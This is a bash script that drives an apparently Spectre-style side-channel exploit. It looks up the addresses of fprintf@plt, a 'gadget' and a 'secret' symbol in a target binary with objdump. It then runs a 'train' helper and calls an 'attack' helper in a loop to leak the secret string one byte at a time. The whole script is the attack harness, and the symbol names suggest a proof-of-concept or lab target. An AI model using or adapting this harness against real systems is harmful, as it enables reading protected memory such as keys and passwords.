#!/bin/bash
trap "kill -- -$$" SIGINT SIGTRAP EXIT
if (( $# != 2)); then
    echo "usage: $0 port target" >&2
    exit 1
fi
port=$1
target=$2

exec 3>&1
function offset() {
    symbol=$2
    addr=$(objdump $1 $target | egrep -w "$symbol" | head -n1 | awk -Wposix '{printf "%d\n","0x" $1}')
    if [[ -z $addr ]]; then
        echo "failed to find offset for $symbol" >&2
        exit 1
    fi
    echo "$symbol offset is $addr" >&3
    echo $addr
}

plt=$(offset -d fprintf@plt)
gadget=$(offset -t gadget)
secret=$(offset -t secret)

./train $target $plt $gadget &

echo "reading data..."
addr=$secret
str=""
while true; do
    ch=$(./attack $port $addr $target 0x20000)
    if [[ "$ch" == $(printf '\0') ]]; then break; fi
    echo -n "$ch"
    str="$str$ch"
    let addr++
done
echo ''
